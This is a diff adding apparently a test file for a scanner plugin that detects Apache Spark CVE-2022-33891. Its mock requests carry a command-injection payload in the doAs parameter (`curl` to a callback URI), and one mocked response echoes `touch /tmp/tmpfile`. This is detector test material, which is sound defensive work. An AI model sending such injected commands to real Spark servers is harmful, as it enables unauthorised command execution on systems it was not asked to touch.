@@ -1,0 +1,83 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "ApacheSpark_CVE_2022_33891"
+}
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: 
+          '...\n'
+          '<title>Spark Master at spark://b41e42d519dc:7077</title>\n'
+          '...\n'
+      },
+      {
+        uri: "/?doAs=`curl%20{{ T_CBS_URI }}`"
+        status: 403
+        body_content: 
+          '...\n'
+          '<title>Error 403 User `touch /tmp/tmpfile` is not authorized to access this page.</title>\n'
+          '...\n'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotVulnerable_returnsFalse"
+  expect_vulnerability: false
+  
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/"
+        status: 200
+        body_content: 
+          '...\n'
+          '<title>Spark Master at spark://b41e42d519dc:7077</title>\n'
+          '...\n'
+      },
+      {
+        uri: "/?doAs=`curl%20{{ T_CBS_URI }}`"
+        status: 200
+        body_content: 
+          '...\n'
+          'Spark Master at spark://2997522835aa:7077\n'
+          '...\n'
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotJenkins_returnsFalse"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
